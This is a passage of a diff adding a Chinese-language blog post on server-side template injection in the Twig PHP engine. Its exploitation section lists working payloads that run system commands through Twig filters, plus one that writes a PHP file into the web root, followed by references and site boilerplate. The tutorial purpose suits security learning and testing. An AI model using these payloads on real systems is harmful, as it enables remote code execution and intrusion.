+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;passthru&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)}}</span>    <span class="c1">// 无回显
+</span></span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>通用payload</p>
+<p>来源：<a class="link" href="https://xz.aliyun.com/t/7518#toc-5"  target="_blank" rel="noopener"
+    >TWIG 全版本通用 SSTI payloads</a> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{{</span><span class="s2">&#34;&lt;?php phpinfo();&#34;</span><span class="o">:</span><span class="s2">&#34;/var/www/html/shell.php&#34;</span><span class="p">}</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="reference">Reference</h3>
+<p><a class="link" href="https://twig.symfony.com/"  target="_blank" rel="noopener"
+    >Twig</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://twig.symfony.com/doc/3.x/intro.html#installation"  target="_blank" rel="noopener"
+    >Twig Docs: Introduction</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://twig.symfony.com/doc/3.x/templates.html"  target="_blank" rel="noopener"
+    >Twig for Template Designers</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://twig.symfony.com/doc/3.x/api.html"  target="_blank" rel="noopener"
+    >Twig for Developers</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://xz.aliyun.com/t/10056#toc-14"  target="_blank" rel="noopener"
+    >Twig 模板注入从零到一</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://twig.symfony.com/doc/3.x/filters/map.html"  target="_blank" rel="noopener"
+    >map</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://twig.symfony.com/doc/3.x/filters/sort.html"  target="_blank" rel="noopener"
+    >sort</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://twig.symfony.com/doc/3.x/filters/filter.html"  target="_blank" rel="noopener"
+    >filter</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://twig.symfony.com/doc/3.x/filters/reduce.html"  target="_blank" rel="noopener"
+    >reduce</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://xz.aliyun.com/t/7518#toc-5"  target="_blank" rel="noopener"
+    >TWIG 全版本通用 SSTI payloads</a> <!-- raw HTML omitted --></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ssti/">ssti</a>
+        
+            <a href="/tags/twig/">twig</a>
+        
+            <a href="/tags/php/">php</a>
+        
+            <a href="/tags/web_security/">web_security</a>
+        
+            <a href="/tags/template_engine/">template_engine</a>
+        
+            <a href="/tags/server_side/">server_side</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Jul 01, 2022 23:41 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/ssti_basic/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Server Side Template Injection (SSTI) 模板注入：基础知识</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/php_bypass_query_string_parser/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">如何利用PHP查询字符串解释器来绕过IDPS以及WAF</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/php_bypass_tricks/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP特性绕过技巧</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/php_serialize_unserialize/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 序列化与反序列化</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/mysql_tricks/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mysql中的“奇技淫巧”</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2022 Under The Ginkgo
+    </section>
+
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <section class="powerby">
+      <span id="busuanzi_container_site_pv" style='display:none'>
+        Viwe <span id="busuanzi_value_site_pv"></span> times
+      </span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#ssti-模板注入-twig--php">SSTI 模板注入：Twig(PHP)</a>
+      <ul>
+        <li><a href="#简介与安装">简介与安装</a></li>
+        <li><a href="#基础语法">基础语法</a></li>
+        <li><a href="#twig的api使用">Twig的API使用</a></li>
+        <li><a href="#漏洞利用">漏洞利用</a>
+          <ul>
+            <li><a href="#1-dot-x">1.x</a></li>
+            <li><a href="#2-dot-x-3-dot-x">2.x / 3.x</a></li>
+          </ul>
+        </li>
+        <li><a href="#reference">Reference</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
